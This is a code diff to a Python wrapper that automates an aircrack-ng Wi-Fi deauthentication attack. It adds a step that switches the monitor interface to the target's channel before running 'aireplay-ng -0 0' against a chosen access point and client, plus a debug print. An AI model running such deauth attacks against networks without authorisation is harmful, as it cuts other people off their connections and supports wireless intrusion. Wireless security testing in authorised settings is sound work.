@@ -99,6 +99,7 @@ class aircrack:
         ap = aireplay()
         net = aircrack.search_network()
         station = aircrack.search_station()
+        print(net,station[0])
         ap.deauth_attack(net, station[0])
 
 class aireplay:
@@ -106,11 +107,17 @@ class aireplay:
     def deauth_attack(self, net: airodumpNet, station: airodumpStation):
         cmd = ('sudo aireplay-ng -0 0 -a %s -c %s wlan0mon' %  (net.BSSID, station.MAC))
         print(cmd)
+        self.change_channel(net)
         result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
         out, err = result.communicate()
         print(out)
         time.sleep(15)
         result.kill()
+
+    def change_channel(self, net: airodumpNet):
+        cmd = ('sudo iwconfig wlan0mon channel %s' % net.channel)
+        subprocess.call(cmd, shell=True)
+
 
 
 
